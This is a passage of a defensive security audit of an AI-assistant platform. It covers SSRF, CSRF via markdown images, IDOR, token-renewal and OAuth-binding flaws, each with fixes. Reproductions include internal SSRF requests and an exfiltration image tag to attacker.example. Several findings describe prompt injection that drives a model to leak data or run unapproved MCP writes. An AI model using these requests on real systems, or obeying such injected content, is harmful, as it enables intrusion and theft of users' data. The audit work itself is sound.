**Reproduction.** A temporary redirector inside the backend container answered `/r` with `302 Location: http://qdrant:6333/collections` (first hop used a SYN-05 host because no public host exists offline):
```
POST /api/v1/url-watches {"url":"http://0x7f.0.0.1:18999/r"} ; POST /api/v1/url-watches/N/refresh
 -> {"result":{"collections":[{"name":"user_documents"},…]}}
POST /api/v1/widgets/{id}/test-api {"apiUrl":"http://0x7f.0.0.1:18999/r"} -> {"reachable":true,"responsePreview":"{\"result\":…"}
```
The redirect target is refused when submitted directly (`blocked_url`).

**Impact / Severity.** As SYN-05. High, CVSS 8.5. CWE-918, CWE-601 (CWE-367 for rebinding).

**Fix.** Route all four through the hop loop written for `fetchForReading()` (`max_redirects: 0`, guard and pin per hop, fail closed). Set `max_redirects: 0` in `framework.http_client.default_options`. Tests: `MockHttpClient` returning 302 to `http://127.0.0.1/` yields `blocked_address` for all four; an architecture test forbidding `max_redirects > 0` next to `EgressCall::typed`.

**Detection.** Today: one info line for the original URL. Proposed: log final URL and hop count for typed fetches; alert when a hop's host is private.

**Related.** `plugins/castingdata/backend/Service/CastingApiClient.php:99-110,149-160` (default 20 redirects); `WordPressIntegrationService.php:381-385`; `MarketingNewsFeedService.php:92-98` (public route, first hop limited to feed hosts, `image/*` only); `SlackNotificationService.php:296`.

---

### SYN-07 Synaform URL sources: full-read SSRF with no guard

**Where.** `plugins/synaform/backend/Controller/SynaformController.php:2262-2274` (`candidatesUrlsAdd`: scheme/host check only), `:6480-6494` (`fetchUrlText`: raw `HttpClientInterface`, `max_redirects: 5`), `:2345` (refresh). No `SsrfGuard`, no `NoPrivateNetworkHttpClient`.

**Preconditions.** Signed-in user with the plugin enabled (as SYN-03).

**Reproduction**
```
POST /api/v1/user/4924/plugins/synaform/candidates/{id}/urls {"url":"http://qdrant:6333/collections"}
 -> 200 text_snippet {"result":{"collections":[{"name":"user_documents"},{"name":"user_memories"},{"name":"user_message_digests"}]},…}
```
Internal host names work directly; up to 60 000 characters are returned.

**Severity.** High. CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = 7.7. CWE-918.

**Fix.** Inject the guarded client (`mcp.http_client` pattern) into the plugin and set `max_redirects: 0` with the hop loop. Test: adding `http://qdrant:6333/` returns a blocked error and stores no snippet.

**Detection.** None today. Proposed: plugin outbound requests go through the shared client and its private-address alert (SYN-05).

**Related.** SYN-24 (castingdata).

---

### SYN-08 WhatsApp webhook accepts unsigned payloads

**Where**
- `backend/config/packages/security.yaml:250`; `backend/src/Controller/WebhookController.php:174-246` — reads no signature header; `X-Hub-Signature` appears nowhere in `backend/src`.
- `backend/src/Service/WhatsApp/WhatsAppService.php:661-669` — `verifyWebhookSignature()` exists, has no caller, and keys the HMAC with the verify token instead of Meta's app secret. No app-secret setting exists.
- `backend/src/Service/Email/EmailChatService.php:125-155` — `findOrCreateUserFromPhone`, newest verification wins.
- `backend/src/Service/WhatsApp/Turn/WhatsAppIntake.php:254-315` — `handleVerificationCode` sets `phone_verified_at` from the forged `from`.
- `WebhookController.php:117-138` — GET verify compares with `===` and accepts an empty configured token.
- Only guard: `backend/src/Module/Http/ModuleGateListener.php:53` (module configured or 404).

**Status.** Confirmed by complete code trace. Not reproduced: the module is off locally (POST → `404 {"error":"feature_not_configured","module":"whatsapp"}`). Live: `GET /api/v1/webhooks/whatsapp?hub.mode=subscribe&hub.verify_token=&hub.challenge=abc` → `200 abc`. Missing to reproduce: enable the module with a dummy token and send one unsigned POST.

**Preconditions.** `WHATSAPP_ENABLED=true` and an access token (any deployment using the channel).

**Impact.** (a) Turns as any phone-verified user: history injection, plan steps and tools, quota, replies from the business number. (b) Number takeover: the attacker requests verification of the victim's number in their own account, reads the code in their UI, forges the inbound code message; the victim's later real messages land in the attacker's account. (c) Attacker `mediaId` is interpolated into the Graph URL path (`WhatsAppService.php:682-718`).

**Severity.** High. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L` = 8.6. CWE-345, CWE-306.

**Fix**
```diff
--- a/backend/src/Controller/WebhookController.php
+++ b/backend/src/Controller/WebhookController.php
@@ public function whatsapp(Request $request): JsonResponse
+        $expected = 'sha256='.hash_hmac('sha256', $request->getContent(), $this->whatsappAppSecret);
+        if ('' === $this->whatsappAppSecret
+            || !hash_equals($expected, (string) $request->headers->get('X-Hub-Signature-256'))) {
+            return $this->json(['error' => 'Invalid signature'], Response::HTTP_UNAUTHORIZED);
+        }
@@ public function whatsappVerify(Request $request): Response
-        if ('subscribe' === $mode && $token === $this->whatsappWebhookVerifyToken) {
+        if ('subscribe' === $mode && '' !== $this->whatsappWebhookVerifyToken
+            && hash_equals($this->whatsappWebhookVerifyToken, (string) $token)) {
```
Add `WHATSAPP_APP_SECRET`; `WhatsappModule::isConfigured()` requires it; gate the GET route with the module; dedupe on message id; validate `mediaId` as digits; delete the dead `verifyWebhookSignature()`. Tests: unsigned / wrong signature → 401 and no `Message` row; empty token → 403.

**Detection.** Today: forged posts look like normal webhook traffic; the verification code is logged at info (`PhoneVerificationController.php:192-197`). Proposed: count signature failures; alert when a phone number is re-verified to a different account.

**Related.** SYN-01.

---

### SYN-09 On-site request forgery through same-origin markdown images

**Where**
- `frontend/src/composables/useMarkdown.ts:84-118` — `isTrustedImageSrc` accepts any same-origin path (explicitly `/api/…`, `:98`); rendered as `<img src>` at `:172-182`.
- Viewers: `WidgetSessionsView.vue:601-608,2247`, `ChatMessage.vue:405`, `SharedChatView.vue:219`, `KnowledgeSources.vue:98`, `TaskCard.vue:505`, `ResearchDraft.vue:15`.
- `backend/src/Controller/StreamController.php:48` — `/stream` accepts `GET` and `POST`; `:236-260` starts a turn from query parameters with cookie auth.
- `backend/src/Controller/LegacyApiController.php:53-86` — `/api.php` `GET|POST`; `:644-656` merges query and body; `promptUpdate` (`:406`), `saveWidget` (`:382`), `createApiKey` (`:357`) write on GET.
- `backend/src/Service/Auth/AuthCookieFactory.php:43-54` — SameSite does not help; the request is same-origin.

**Preconditions.** A widget visitor (or any party whose text an account holder views) and the operator opening the conversation. No victim typing or clicking beyond opening it.

**Reproduction** (own test account; widget `wdg_d9af…`, owner chat 4699)
```
# visitor, anonymous
POST /api/v1/widget/wdg_d9af…/message
     {"sessionId":"sess_auditfe…","text":"hi ![x](/api/v1/messages/stream?chatId=4699&message=AUDITFE-VISITOR-MARKER-3)"}
# owner opens /channels/widgets/wdg_d9af…/chats and clicks the conversation (Chromium 156)
DOM: <img src="/api/v1/messages/stream?chatId=4699&message=AUDITFE-VISITOR-MARKER-3">
Result: chat 4699 gained that IN message plus a reply.
# same vector against the legacy API
GET /api.php?action=promptUpdate&topic=general&tool_files=1   -> 200 "Prompt updated successfully"
```

**Impact.** An unauthenticated visitor runs turns with an attacker-written prompt in the operator's account (agents, web search, files, tools, quota) and writes settings through `/api.php`, including the global prompt (SYN-15) and an API key for a paid account. With SYN-16 the reply can be exfiltrated. The victim chat id is needed for `/stream`; ids are sequential and the widget's own SSE returns an owner-owned chat id.

**Severity.** High. CVSS 3.1 `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N` = 7.1. CWE-352, CWE-650.

**Fix**
```diff
--- a/backend/src/Controller/StreamController.php
+++ b/backend/src/Controller/StreamController.php
@@ -48 +48 @@
-    #[Route('/stream', name: 'stream', methods: ['GET', 'POST'])]
+    #[Route('/stream', name: 'stream', methods: ['POST'])]
--- a/frontend/src/composables/useMarkdown.ts
+++ b/frontend/src/composables/useMarkdown.ts
@@ isTrustedImageSrc
-  if (src.startsWith('/') && !src.startsWith('//')) return true
+  if (src.startsWith('/api/v1/files/') || src.startsWith('/up/')) return true
```
- Remove the EventSource caller (`frontend/src/services/apiService.ts:425-436`); `LegacyApiController` POST only, or delete it.
- A request subscriber that refuses cookie-authenticated requests with `Sec-Fetch-Dest` outside `{empty, document}`, and unsafe methods with `Sec-Fetch-Site: cross-site`.
- Apply the image rule to raw-HTML `img` as well (SYN-16).
- Tests: PHPUnit GET → 405 for both routes; Vitest: the markdown above renders no `img`; Playwright `@ci`: opening a visitor message issues no request to `/messages/stream`.

**Detection.** Today: looks like a normal turn. Retro-hunt: access-log GETs to `/api/v1/messages/stream` and `/api.php` with `Sec-Fetch-Dest: image`, or whose `Referer` is a widget-sessions page. After the fix: alert on any GET to those routes and on cookie-authenticated `/api/` requests with `Sec-Fetch-Dest: image`.

**Related.** In an embedded widget the relative path resolves against the customer's origin. Other GET routes were screened by name only.

---

### SYN-10 `GET /api/v1/messages/{id}/status` returns any user's reply text

**Where.** `backend/src/Controller/MessageController.php:937-952`; `backend/src/Service/Message/MessageEnqueueService.php:81-104` — `find($messageId)`, then status, topic, language and the OUT text, no owner check. Done right: every sibling route uses `denyMessage` / owner-filtered lookups (`GET /api/v1/messages/{id}` → 404).

**Preconditions.** Any signed-in user; message ids are sequential.

**Reproduction** (as demo; message 4049 belongs to another account; repeated by the lead on ids 4098 and 4049)
```
GET /api/v1/messages/4049/status -> 200 {"status":"complete","topic":"general","language":"en",
    "response":"… canned reply to your message 'private-note audit-authza: my vault code is zebra-4471' …"}
GET /api/v1/messages/4049        -> 404
```

**Impact.** Any account can walk the id space and read every user's assistant replies, topics and languages.

**Severity.** High (authenticated cross-tenant read). CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5. CWE-639.

**Fix**
```diff
--- a/backend/src/Service/Message/MessageEnqueueService.php
+++ b/backend/src/Service/Message/MessageEnqueueService.php
@@
-    public function getMessageStatus(int $messageId): ?array
+    public function getMessageStatus(int $messageId, int $userId): ?array
     {
         $message = $this->messageRepository->find($messageId);
-        if (!$message) {
+        if (!$message || $message->getUserId() !== $userId) {
             return null;
         }
```
Test: user A's message id requested by B → 404.

**Detection.** Today: ordinary 200s. Retro-hunt: accounts requesting many distinct ids on this route, or ids they do not own (join access log to `BMESSAGES`). Proposed: alert on more than N distinct ids per account per minute; after the fix the 404 rate is the signal.

**Related.** None found; other `->find($id)` call sites on Message/Chat/File were checked.

---

### SYN-11 Access token renews itself; logout, revoke-all and password reset do not end a session

**Where.** `backend/src/Controller/AuthController.php:1157-1198` (`GET /api/v1/auth/token` mints a new 5-minute access token for whatever principal is authenticated); `backend/src/Security/CookieTokenAuthenticator.php:58-63,88-125`; `backend/src/Security/QueryTokenAuthenticator.php:31-68` (`?token=` accepted on every `/api` route); `backend/src/Service/Auth/TokenService.php:164-183` (signature + `exp` + user status only), `:307-330` (`revokeAllUserTokens` deletes refresh rows only). Token placed in URLs: `frontend/src/services/apiService.ts:435`, `frontend/src/services/api/usageApi.ts:172`.

**What.** The design assumes a leaked access token lives 5 minutes (`ImpersonationService.php:32-35`). Any valid access token can trade itself for a fresh one indefinitely. Done right: refresh tokens are server-side rows checked and deleted (`TokenService.php:234-273`).

**Preconditions.** One leaked access token (proxy/CDN/access logs or browser history via `?token=`, or script access through `/auth/token` itself).

**Reproduction** (own user 4918)
1. Log in, keep access token T0. `POST /api/v1/auth/revoke-all` → 200 `sessions_revoked: 1`.
2. `POST /api/v1/auth/refresh` with the old cookie → 401 `INVALID_REFRESH_TOKEN`.
3. `GET /api/v1/auth/token` with `Authorization: Bearer T0` → 200 new token T1.
4. `GET /api/v1/auth/token?token=<T1>` (no header, no cookie) → 200 T2.
5. Forgot + reset password (200), then `/auth/token` with T2 → 200.
6. 453 s after T0 was issued (TTL 300 s), `GET /api/v1/auth/me` with the latest token → 200.

**Impact.** Indefinite account access that the victim cannot end; only suspension or rotating `APP_SECRET` stops it. Traced, not executed: a copied impersonation token used without the stash cookie yields a normal token for the target user (`AuthController.php:1183-1187`); an unrestricted API key may trade itself for a session token and reach session-only routes (Suspected).

**Severity.** Medium (borders High). CVSS 3.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` = 7.4. CWE-613, CWE-598.

**Fix.** Put a session id (`sid` = refresh-row id) in the access token and reject it in `/auth/token` and `validateAccessToken` when the row is gone. `/auth/token` returns a purpose-limited stream token (`type: "sse"`, ~60 s) accepted only by `QueryTokenAuthenticator` on the SSE routes, and refuses to mint from `?token=`, an API key or an OAuth/OIDC bearer. With SYN-09's fix (POST-only stream) the query token can go away entirely. Tests: token issued before revoke-all → 401 on `/auth/token`; `?token=` on a non-stream route is ignored; API key → 403; impersonation token without stash cookie cannot obtain a clean token.

**Detection.** Today: `/auth/token` logs nothing. Proposed: log each mint with user id, credential source (cookie/header/query) and client address; alert on mints for a user with zero live refresh rows and on `token=` in query strings of non-stream routes.

**Related.** `ApiKeyAuthenticator.php:51,83` accepts `?api_key=`; media tokens (1800 s) ignore later suspension.

---

### SYN-12 SVG uploaded as `.heic` reaches ImageMagick's SVG/MVG/MSL coders

**Where.** `backend/src/Service/File/HeicConverter.php:187-202` (fallback `readImage` without a format prefix); `backend/src/Service/File/FileStorageService.php:150-152,251-257`; stock `/etc/ImageMagick-6/policy.xml` in the image.

**Reproduction** (demo). Upload `audit-inj-svg.heic` containing an SVG with `<image xlink:href="/var/www/frontend/favicon-32.png">` → stored as JPEG; `GET /api/v1/files/362/download` shows the local image composited. A non-existent href → "Could not process this HEIC photo" (file-existence oracle). On the CLI in the container only: `text:` aborts, `msl:` segfaults, `mvg:`/`label:` are processed, `http:`/`ephemeral:` are refused.

**Impact.** Confirmed: inclusion of local image files and a path-existence oracle. Likely: worker crash; the MSL/MVG coders are a known route to file read/write and were not pushed further (non-destructive rule).

**Severity.** Medium as demonstrated (reviewer rated High for the reachable coder set). CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H` = 7.1. CWE-434, CWE-20.

**Fix.** Check the ISO-BMFF `ftyp` brand before conversion; drop the fallback; read with an explicit `heic:` prefix; ship a `policy.xml` that allows only JPEG/PNG/GIF/WEBP/HEIC and denies `MVG`, `MSL`, `SVG`, `TEXT`, `LABEL`, `URL`, `EPHEMERAL`. Test: the SVG-as-heic upload is rejected with 4xx.

**Detection.** Today: a generic conversion error. Proposed: log declared extension vs sniffed type on mismatch and alert on repeats per account.

**Related (not exercised).** `WidgetPublicController.php:596` (public upload), `VisionAttachmentEncoder.php:256`, `AI/Image/PngJpegInlineImages.php:94-95`, `DocumentGeneratorService.php:211`.

---

### SYN-13 Guests can attach and download other guests' files

**Where.** `backend/src/Service/Chat/Stream/StreamCallerResolver.php` (`guest()`: all guests act as one processing user); `StreamTurnPreparer.php:254`; `backend/src/Controller/GuestChatController.php:550-557` (download), `:607-631` (export).

**Reproduction**
```
GET  /api/v1/guest/files/<guestB>/363/download                                                    -> 403
POST /api/v1/messages/stream {"guestSession":"<guestB>","chatId":4708,"message":"hello","fileIds":"363"} -> 200
GET  /api/v1/guest/files/<guestB>/363/download                                                    -> 200 image/png 3957 bytes
```
Controls that hold: a guest naming another guest's chat is refused; a guest naming a registered user's file attaches nothing.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = 5.3. CWE-639.

**Fix.** Same `callerMayAttach` rule as SYN-02 (guest: only files already in the session chat). Test: stream as guest B with guest A's file id → not attached, download stays 403.

**Detection.** None today; add the same "fileIds not bound to session" warning as SYN-02.

---

### SYN-14 Widget visitor uploads are indexed into a RAG group shared by all visitors

**Where.** `backend/src/Controller/WidgetPublicController.php:584-697` (`processWidgetFile`: `vectorizeAndStore` under the owner id, group `WIDGET:{widgetId}`); `backend/src/Service/Widget/Turn/WidgetReply.php:93-117` (retrieval with that group, no session filter). File rows are session-bound (right); the vector index is not.

**Preconditions.** Widget with `allowFileUpload = true`.

**Reproduction.** Visitor A uploads `visA.txt` via `POST /api/v1/widget/$W/upload` → file 359. Visitor B (new session) sends a message; the SSE carries `ragSources: [{chunkId:"doc_4919_359_0", fileId:359, groupKey:"WIDGET:wdg_…", score:1}]`. Score 1 is an artefact of the test embedding provider; with a real model B needs a related question.

**Impact.** Cross-visitor disclosure of uploaded documents; a visitor can poison the widget's knowledge for everyone (stored prompt injection).

**Severity.** Medium. CVSS 3.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N` = 6.5. CWE-668.

**Fix.** Index visitor uploads under `WIDGET:<id>:S:<sessionId>` and query the curated group plus the session group, or skip vectorisation and pass the extracted text only in that session's turn. Test: A uploads; B's reply lists no file of A.

**Detection.** Proposed: log `ragSources.fileId` whose `userSessionId` differs from the requesting session.

---

### SYN-15 Legacy `promptUpdate` rewrites the global system prompt's metadata

**Where.** `backend/src/Controller/LegacyApiController.php:406-476` → `backend/src/Repository/PromptRepository.php:191-216` (`findByTopicAndUser` falls back to owner 0) → `backend/src/Service/Prompt/PromptService.php:71-88,149-181` (deletes and re-creates all metadata rows). No owner check. Done right: `PromptController.php:968/995`.

**Preconditions.** Any verified account of the lowest level; or no account at all through SYN-09.

**Reproduction.** `GET /api.php?action=promptUpdate&topic=general&tool_files=1` as a level-NEW user → 200 "Prompt updated successfully". This was executed once by accident during the audit and did change shared local state (Appendix A).

**Impact.** One user changes `tool_files`, `tool_internet`, `aiModel` on the system prompt every account uses.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L` = 5.4. CWE-639, CWE-862.

**Fix**
```diff
@@ LegacyApiController::promptUpdate
+        if ($prompt->getOwnerId() !== $userId) {
+            return $this->json(['error' => 'Create a personal override first'], Response::HTTP_FORBIDDEN);
+        }
```
or remove the action together with the rest of `/api.php`. Test: level-NEW user, system topic → 403, `BPROMPTMETA` unchanged.

**Detection.** Today: nothing. Retro-hunt: `BPROMPTMETA` rows on owner-0 prompts with a `BCREATED` later than the last migration/seeder run. Proposed: audit event on every write to an owner-0 prompt with the actor id.

**Related.** `saveWidget` and the other legacy actions were not reviewed one by one.

---

### SYN-16 Markdown sanitiser passes raw HTML with external `img` and `style` URLs

**Where.** `frontend/src/composables/useMarkdown.ts:218-325` — `ALLOWED_TAGS` include `img`, `input`, `div`, `svg`, `use`; `ALLOWED_ATTR` include `src`, `style`, `id`, `xlink:href`; only Markdown `![]()` images are limited to same origin (`:84-112`). Used by `MessageText.vue:832,843`, `widgets/ChatWidget.vue:2254`. No Content-Security-Policy anywhere.

**Reproduction** (app's own `render()` in Chromium on localhost:5173). `<img src="https://attacker.example/x.png?d=SECRET">` survives; a fixed-position full-viewport `div` with `background:url(…)` and an external link survives; `<input type="password">`, `id="app"`, `<svg><use xlink:href="https://…">` survive. Blocked: `script`, handlers, `javascript:`, iframes, forms. `![md](https://…)` is correctly replaced.

**Impact.** Zero-click exfiltration of conversation, memory or file content when a model is induced (page, document, RAG chunk, MCP result) to emit such HTML; fake sign-in overlay, also over a customer page in the widget; visitor-authored HTML loads in the operator's view. Not shown end to end with a real model.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = 6.1. CWE-79 (HTML injection), CWE-200, CWE-1021.

**Fix.** DOMPurify `afterSanitizeAttributes` hook: apply `isTrustedImageSrc` to every `IMG[src]`; allow `INPUT` only as a disabled checkbox; drop `style` except on KaTeX output (or drop values containing `url(` / `image-set(`); drop `id` and `xlink:href`. Add a CSP with `img-src 'self' data: blob:` and a report endpoint. Tests: the inputs above in the `useMarkdown` unit spec.

**Detection.** Not visible server-side today. A CSP `report-to` endpoint would show attempts.

**Related.** All `render()` callers; `sanitizeMermaidSvg` (`useMarkdownMermaid.ts:33-40`).

---

### SYN-17 No throttling on login, forgot-password, reset-password, verify-email

**Where.** `backend/src/Controller/AuthController.php:344-437` (login), `:906-943` (forgot, synchronous mail), `:947-989` (reset), `:860-902` (verify). `backend/config/packages/rate_limiter.yaml` has limiters for setup, signup, checkout, email link, code signup, OAuth client auth — none for these four. Done right: `EmailLinkController`, `CodeSignup`, `SetupController`.

**Reproduction** (own accounts, small counts). 40 consecutive wrong passwords → 40 × 401, then the right one → 200, no delay or 429. 8 × forgot-password → 8 mails, 8 live reset rows; using one leaves the other 7 valid.

**Impact.** Full-speed password guessing and credential stuffing (policy is length ≥ 8); mail bombing through the instance's sender reputation; timing reveals whether an address exists.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` = 6.5. CWE-307, CWE-799.

**Fix.** `login_ip` and `login_account` limiters with back-off, `password_reset_ip` / `password_reset_email` (3 per hour per address), limiters on reset and verify; a successful reset deletes the user's other reset tokens; queue the mail. Tests: Nth failed login → 429; second reset token dead after one was used.

**Detection.** Today: failed logins are logged one by one, nothing aggregates. Proposed: per-account and per-address failure counters with an alert threshold; the limiter's 429s are the signal.

---

### SYN-18 Pre-registration hijack through an unverified password signup

**Where.** `backend/src/Controller/AuthController.php:220-268`, `backend/src/Service/Iam/UserLifecycleService.php:61-91` (unverified account with a chosen password for any free address); `GoogleAuthController.php:187,237-239`, `GitHubAuthController.php:210,278-280`, `AppleAuthController.php:329,372` (existing row reused and flipped to verified, password untouched); `EmailLinkSignIn` and `CodeSignup.php:136` → `markEmailVerified` (`:204-210`, revokes refresh tokens, keeps the password).

**Status.** Confirmed by code trace; first half live (register → login returns 403 `EMAIL_NOT_VERIFIED`, wrong password 401, so the password is stored). The merge step needs a real identity provider.

**Impact.** The attacker registers the victim's address first; when the owner later arrives through social login, email link or code signup, the attacker's password logs in to the live account.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` = 6.8. CWE-287.

**Fix.** One helper in `UserLifecycleService` used by all five doors: when external proof arrives for an unverified account, null the password, delete outstanding verification/reset tokens and API keys, revoke refresh tokens. Test: unverified user with password → simulated Google callback → password login 401.

**Detection.** Today: a normal social-login line. Proposed: audit event when a social login adopts an unverified local account; purge unverified accounts older than N days.

---

### SYN-19 Connector and MCP OAuth callbacks are not bound to the initiating browser

**Where.** `backend/config/packages/security.yaml:169-171` (three callbacks public); `MicrosoftConnectionController.php:102-109,132-155`; `DropboxConnectionController.php:100-107,130-151`; `backend/src/Service/OAuth/OAuthConsentService.php:47-65,73-110,115-133` (owner taken from the state; PKCE verifier cached server-side under the attacker's state); `OAuthStateService.php:43-100` (HMAC, 600 s, not single-use, no browser binding); `McpOAuthController.php:126`, `McpOAuthConsentService.php:62,143,154-173`.

**Status.** Confirmed by code trace; not reproduced (providers not configured: `GET /api/v1/connections/m365/start` → 503; the flow needs third-party traffic).

**What.** An attacker starts a connect flow in their own account and sends the provider URL to a victim. When the victim consents, the callback stores the victim's provider tokens on the attacker's connection.

**Impact.** The attacker's Synaplan account reads the victim's mail, sends mail as them and edits their calendar (M365 `Mail.Read`, `Mail.Send`, `Calendars.ReadWrite`), or reads/writes their Dropbox, until the grant is revoked. The victim needs no Synaplan account.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N` = 6.3. CWE-352, CWE-384.

**Fix.** `start` sets a short-lived HttpOnly SameSite=Lax cookie with a random nonce and puts its hash in the state; the callback requires the cookie to match and, when a session exists, `state.owner_id === current user`; the nonce is single-use.
```php
$payload = $this->state->verify($provider, $state);
if (!hash_equals($payload['browser'] ?? '', hash('sha256', $browserNonce))) {
    throw new OAuthStateException('This sign-in was started in another browser.');
}
```
Tests per provider: valid state with no cookie / a cookie from another `start` → error redirect, no `Connection` row.

**Detection.** Today: a normal successful connect. Proposed: log the session user (or "none") next to `state.owner_id`; alert on mismatch; "new connection" notice to the owner showing the external account identity.

**Related.** SYN-32 (same state on the login flows).

---

### SYN-20 Inbound-email "test connection" opens TCP to arbitrary internal hosts and ports

**Where.** `backend/src/Controller/InboundEmailHandlerController.php:196-262`; `backend/src/Service/Email/InboundEmailHandlerService.php:89-135` (error text returned), `:443-488` (`imap_open` on an unchecked host/port; `imap_errors()` in the exception message); `ImapMailboxSearcher.php:34`.

**Reproduction**
```
POST /api/v1/inbound-email-handlers/test-connection
{"mailServer":"qdrant","port":9,"protocol":"IMAP","security":"None","username":"a","password":"x"}
 -> 200 {"success":false,"message":"IMAP connection failed: Connection failed to qdrant,9: Connection refused"}  (0.15 s)
{"mailServer":"mailhog","port":1025,…} -> hangs > 45 s (open port, no IMAP greeting)
```

**Impact.** Internal host/port mapping; a cheap way to hold PHP workers for the c-client timeout; `mailServer` is interpolated into the mailbox spec, so c-client flags may be injectable (not explored).

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L` = 6.4. CWE-918.

**Fix.** Validate `mailServer` as a host name or IP, run it through `SsrfGuard::isBlockedHost()`, restrict ports to 110/143/993/995 unless an operator allows others, `imap_timeout()` of a few seconds, fixed error sentence. Test: `qdrant`, `127.0.0.1`, `169.254.169.254`, `host}/x` refused before `imap_open`.

**Detection.** Today: `IMAP connection test failed` at error with the message; a scan would not be noticed. Proposed: per-user rate limit; alert on private targets or non-mail ports.

---

### SYN-21 Widget live-API data trusts a visitor-supplied `externalUserId`

**Where.** `backend/src/Service/Widget/Turn/WidgetTurnGate.php:79` → `WidgetReply.php:113` → `backend/src/Service/Widget/WidgetApiContext.php:112-121` (substituted into the owner's URL, fetched with the owner's bearer token, injected as "Live API Data"). `rawurlencode` stops path tricks, not the id swap.

**Status.** Confirmed by trace; not exercised (needs an owner-configured external API).

**Impact.** A visitor sets another customer's id and asks the assistant to repeat the data: IDOR into the widget owner's customer API.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N` = 5.8. CWE-639.

**Fix.** Accept the id only with an HMAC (id + expiry) computed by the embedding site with a per-widget secret, verified in `WidgetTurnGate`. Test: unsigned id yields no API context.

**Detection.** Proposed: log a hash of the id per session; alert on many ids per session or client address.

---

### SYN-22 MCP write tools run without approval when driven by injected content

**Where.** `backend/src/Service/Mcp/Permissions/McpToolPermissions.php` (`defaultFor`: only destructive = approve; write = auto); `backend/src/Service/Tool/Policy/ApprovalPolicy.php` (the connection outcome replaces `TOOLS.POLICY` write = approve); `backend/src/Service/Tool/Source/McpClientToolSource.php` (`SideEffect::fromHints` trusts the remote server's `readOnlyHint`); `backend/src/Service/Multitask/Execution/StepApprovalGate.php` (an interactive plan never pauses); `backend/src/Service/Chat/Loop/RegistryChatRunToolbox.php` (web results and MCP tools in one loop).

**Status.** Confirmed by trace (no external MCP server or real model available). `LOOP.ENABLED` ships off.

**Impact.** Text from a fetched page, an attached document, an MCP result or a forged SYN-01/SYN-08 message can cause a write in a connected system, or exfiltrate through a write tool's arguments.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N` = 4.7. CWE-862, CWE-1427.

**Fix.** Default MCP write to approve; ignore `readOnlyHint` from servers the operator has not marked trusted; interactive plan steps that write wait for approval; require approval for any write in a run whose context already holds fetched or tool content. Test: "untouched connection, write tool, interactive → Approve".

**Detection.** Today: tool executions are logged without the approval state. Proposed: record approval state and a "run read untrusted content" flag; alert on unapproved writes in flagged runs.

---

### SYN-23 Apple IAP entitlement weaknesses

Three issues in `backend/src/Service/Iap/`, reproduced on the local stack (which runs the `Xcode` environment, where the library skips certificate-chain checks). Not re-checked by the lead.

| # | Issue | Where | Observed |
|---|---|---|---|
| a | A refunded purchase is re-redeemable with the original signed transaction | `AppleStoreKitVerifier` (`stateFromTransaction` reads only the client-held JWS); `MobilePurchaseService::redeem` (no check of stored refunded status); `backend/config/services.yaml:1102-1109` (online checks never enabled) | verify → PRO; REFUND notification → NEW; same verify → PRO |
| b | Redeem race: one receipt grants several accounts; an IAP tier never lapses on its own | `MobilePurchaseService.php:90,277` (check-then-write, no lock, no unique index), `:196`; `IapEntitlement.php:36-39` (`accountBinding` never compared) | two concurrent redeems both granted |
| c | Transaction not bound to this app's bundle id; `Xcode` / `LocalTesting` environment has no production guard | `AppleStoreKitVerifier::toEntitlement`; library `SignedDataVerifier.php:65-74`, `ChainVerifier.php:92-96` | unsigned JWS with a foreign `bundleId` → PRO; unsigned notification applied (Xcode mode only). Abuse with a real receipt from another app: Suspected |

Done right: Google re-reads state from the Play API (`GooglePlayVerifier.php:58`); `UsageTopup::credit` (unique index); `SignupCodeRepository.php:87-95` (conditional UPDATE).

**Impact.** Paid tier without payment; one subscription for N accounts; on an install left in Xcode mode, free tier and forged revocations by anyone.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` = 4.3 (a); 3.1 (b, c); 6.5 where Xcode mode is active. CWE-294, CWE-362, CWE-347, CWE-1188.

**Fix.** Query the App Store Server API for current status after the JWS verifies, or at minimum refuse a redeem whose stored status is refunded; purchase id in its own table with a unique index inserted in the redeem transaction; compare `accountBinding`; give IAP grants an expiry the level projection enforces; reject a transaction whose bundle id differs from the configured one; refuse Xcode/LocalTesting unless `APP_ENV` is dev or test. Tests for each.

**Detection.** Today: one info line on redeem. Proposed: warn on a refunded → active transition; periodic query for purchase ids on more than one account; critical log at boot when Xcode mode is active outside dev.

---

### SYN-24 castingdata `api_url` SSRF filter bypass

**Where.** `plugins/castingdata/backend/Controller/CastingDataController.php:244-272` (`validateApiUrl`, save-time only), `:279-286` (`canAccessPlugin` checks user id only); `Service/CastingApiClient.php:99-108,139-160` (default redirects).

**Reproduction.** `http://[::ffff:172.18.0.11]:6333/collections#` is accepted (plain private IP and host name are rejected); test-connection → "Connection successful". The fragment drops the fixed path suffix. Response is boolean/blind.

**Severity.** Medium. CVSS 5.0. CWE-918. **Fix:** use `SsrfGuard` + the guarded client at request time. **Detection:** as SYN-05.

---

### SYN-25 Admin model-import SQL validator can be bypassed

**Where.** `backend/src/Service/Admin/ModelSqlValidator.php:87,94,104,126-135`; `ModelImportService.php:96,115`; `AdminModelsController.php:357-411`.

